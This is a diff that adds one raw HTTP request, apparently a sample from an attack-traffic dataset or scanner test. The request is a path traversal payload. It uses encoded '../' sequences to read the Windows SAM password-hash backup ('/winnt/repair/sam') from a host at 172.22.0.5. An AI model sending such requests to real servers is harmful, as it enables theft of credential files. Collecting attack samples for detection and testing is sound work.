@@ -1,0 +1,5 @@
+GET /todB0Meo4rizDYT.html%3FKOYP45sk033NRp=/..//..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Host: 172.22.0.5
+
